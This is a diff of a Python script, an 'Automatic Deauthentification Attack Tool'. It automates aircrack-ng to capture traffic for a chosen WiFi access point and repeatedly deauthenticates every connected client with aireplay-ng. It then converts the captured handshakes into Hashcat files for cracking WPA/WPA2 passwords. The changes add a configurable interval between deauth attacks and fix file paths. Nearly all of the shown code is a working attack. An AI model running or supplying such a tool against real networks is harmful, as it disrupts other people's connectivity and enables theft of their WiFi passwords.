@@ -14,40 +14,45 @@ import os
 
 dirPath = os.getcwd() + '/'
 essid = ''
-interface=''
+interface = ''
+attack_delay = ''
 logo = ('''
 
-                                _____       _______ 
-                          /\   |  __ \   /\|__   __|
-                         /  \  | |  | | /  \  | |   
-                        / /\ \ | |  | |/ /\ \ | |   
-                       / ____ \| |__| / ____ \| |   
-                      /_/    \_\_____/_/    \_\_|   
+                                  _____       _______ 
+                            /\   |  __ \   /\|__   __|
+                           /  \  | |  | | /  \  | |   
+                          / /\ \ | |  | |/ /\ \ | |   
+                         / ____ \| |__| / ____ \| |   
+                        /_/    \_\_____/_/    \_\_|   
                                                               
 ''')
 
 
 def banner():
     cprint(logo, 'blue', attrs=['bold'],)
-    cprint('\t\tAutomatic Deauthentification Attack Tool\n', 'red', attrs=['bold'])
-    cprint('A tool to automate the gathering of WPA/WPA2-PSK WiFi hashes with aircrack-ng tools.\n\n', attrs=['bold'])
-    print('To use:')
-    print('Place your interface into monitor mode using airmon-ng. | airmon-ng start interface')
-    print('Use airodump-ng to display all access points in your area. | airodump-ng interface')
-    print('Run this program with the channel number, access point name, and interface.\n\n')
+    cprint('\t\t  Automatic Deauthentification Attack Tool\n', 'red', attrs=['bold'])
+    cprint('A tool to automate gathering WPA/WPA2-PSK WiFi hashes with aircrack-ng tools.\n\n', attrs=['bold'])
+    cprint('To use:', 'red')
+    print('Place your interface into monitor mode using airmon-ng. | airmon-ng start wlan0')
+    print('Use airodump-ng to display all access points in your area. | airodump-ng wlan0mon')
+    print('Run this program with the channel number, access point name, attack delay time,')
+    print('and interface. Terminate program with Ctrl + c to write .cap and .hccapx results.\n\n')
 
 
 def start_dump():
 
-    # runs airodump-ng to start capturing traffic associated with the Access Point
-    global essid, interface
+    # runs airodump-ng to start capturing traffic associated with the access point
+    global essid, interface, attack_delay
     parser = argparse.ArgumentParser(description=banner())
     parser.add_argument('channel', type=str, metavar='Channel', help='Channel number the AP is broadcasting on.')
-    parser.add_argument('essid', type=str, metavar='ESSID', help='ESSID Name of AP to attack.')
+    parser.add_argument('essid', type=str, metavar='ESSID', help='ESSID name of AP to attack.')
+    parser.add_argument('delay', type=int, metavar='Attack_Delay', help='Time in minutes between deauth attacks (Default is 5).', default=5)
     parser.add_argument('interface', type=str, metavar='Interface', help='Wireless interface to be used.')
     args = parser.parse_args()
     channel = args.channel
     essid = args.essid
+    attack_delay = args.delay
+    attack_delay = int(attack_delay) * 60
     interface = args.interface
     
     subprocess.Popen(['airodump-ng', '-c', channel, '--essid', essid, '-w', 'dump_' + essid, interface])
@@ -55,7 +60,7 @@ def start_dump():
 
 def deauth():
 
-    # parses the airodump-ng log file every 5 minutes and sends 5 deauthentification packet clusters with
+    # parses the airodump-ng log file every n minutes and sends 5 deauthentification packet clusters with
     # aireplay-ng from every station that has been associated with the access point
     time.sleep(15)
     try:
@@ -75,7 +80,7 @@ def deauth():
                     mac_list.remove(mac)
                     if mac not in mac_list and len(mac_list) > 0:
                         subprocess.Popen(['aireplay-ng', '--deauth', '5', '-a', bssid, '-c', mac, interface])
-            time.sleep(300)
+            time.sleep(attack_delay)
     except KeyboardInterrupt:
         clean()
         quit()
@@ -85,9 +90,9 @@ def clean():
 
     # renames capture file, creates a Hashcat v3.6+ file, and removes all other log files
     try:
-        subprocess.call(['cp', 'dump_' + essid + '-01.cap', dirPath + essid + '.cap'])
+        subprocess.call(['cp', dirPath + 'dump_' + essid + '-01.cap', dirPath + essid + '.cap'])
         subprocess.call(['aircrack-ng', '-j', dirPath + essid, 'dump_' + essid + '-01.cap'])
-        os.system('rm dump_*')
+        os.system('rm ' + dirPath + 'dump_*')
     except:
         quit()
 
